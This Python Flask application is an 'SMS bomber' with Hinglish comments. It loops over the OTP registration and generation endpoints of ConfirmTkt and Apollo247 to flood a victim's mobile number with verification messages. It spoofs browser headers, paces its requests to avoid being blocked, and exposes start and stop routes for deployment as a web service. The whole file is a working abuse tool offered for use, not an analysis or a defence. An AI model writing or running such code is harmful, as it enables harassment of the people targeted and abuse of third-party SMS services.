import os
import time
import requests
import threading
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

active_tasks = {}

def send_bomber(mobile):
    count = 1
    # Sessions manage connections better
    session = requests.Session()
    
    # Headers ko aur real banaya gaya hai
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Referer": "https://www.confirmtkt.com/",
        "Origin": "https://www.confirmtkt.com"
    }

    while active_tasks.get(mobile):
        # --- API 1: ConfirmTkt (POST Method) ---
        try:
            payload = {"mobileNumber": mobile}
            res1 = session.post(
                "https://securedapi.confirmtkt.com/api/platform/register", 
                json=payload, 
                headers=headers, 
                timeout=10
            )
            print(f"[{mobile}] API 1 Status: {res1.status_code} - Count: {count}")
        except Exception as e:
            print(f"API 1 Error: {e}")

        # --- API 2: Apollo (Backup) ---
        try:
            res2 = session.get(
                f"https://m.apollo247.com/api/v2/otp/generate?mobile={mobile}", 
                headers=headers, 
                timeout=10
            )
            print(f"[{mobile}] API 2 Status: {res2.status_code}")
        except Exception as e:
            print(f"API 2 Error: {e}")

        count += 1
        time.sleep(20) # 20 seconds ka gap taaki block na ho

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bomber():
    mobile = request.form.get('mobile')
    if not mobile or len(mobile) != 10:
        return jsonify({"status": "error", "message": "Invalid Number"})
    
    if mobile not in active_tasks or not active_tasks[mobile]:
        active_tasks[mobile] = True
        # Background process start karna
        t = threading.Thread(target=send_bomber, args=(mobile,))
        t.start()
        return jsonify({"status": "success", "message": f"OTP Loop Started for {mobile}"})
    return jsonify({"status": "info", "message": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_bomber():
    mobile = request.form.get('mobile')
    active_tasks[mobile] = False
    return jsonify({"status": "success", "message": "Stopped"})

if __name__ == "__main__":
    # Render ke port par run karna
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
